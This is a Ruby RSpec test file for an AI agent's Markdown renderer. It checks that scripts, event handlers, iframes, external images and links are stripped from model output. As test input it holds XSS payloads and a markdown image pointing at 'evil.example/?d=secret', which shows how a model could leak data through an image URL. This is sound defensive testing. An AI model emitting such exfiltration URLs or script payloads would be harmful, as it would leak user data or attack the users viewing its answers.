require "rails_helper"

RSpec.describe Agent::MarkdownRenderer do
  def render(text) = described_class.html(text)

  it "renders what an answer needs: emphasis, lists and tables" do
    html = render("**Total** 12,00 EUR\n\n- one\n- two\n\n| a | b |\n|---|---|\n| 1 | 2 |\n")

    expect(html).to include("<strong>Total</strong>", "<li>one</li>", "<table>", "<td>1</td>")
  end

  it "drops raw HTML, scripts and event handlers" do
    html = render("hello <script>alert(1)</script> <b onclick=\"x()\">bold</b> <iframe src=\"http://e\"></iframe>")

    expect(html).not_to match(/<script|onclick|<iframe|alert\(1\)<\/script/)
  end

  it "shows no external image, which would let the model leak data through a URL" do
    expect(render("![x](http://evil.example/?d=secret)")).not_to include("<img", "evil.example")
  end

  it "builds no link from an address the model gave, internal or external" do
    html = render("[click](http://evil.example) and [js](javascript:alert(1)) and https://evil.example/auto")

    expect(html).not_to include("<a ", "href")
    expect(html).to include("click")
  end

  it "is html_safe only after sanitizing, and empty for no text" do
    expect(render("x")).to be_html_safe
    expect(render(nil)).to eq("")
  end
end
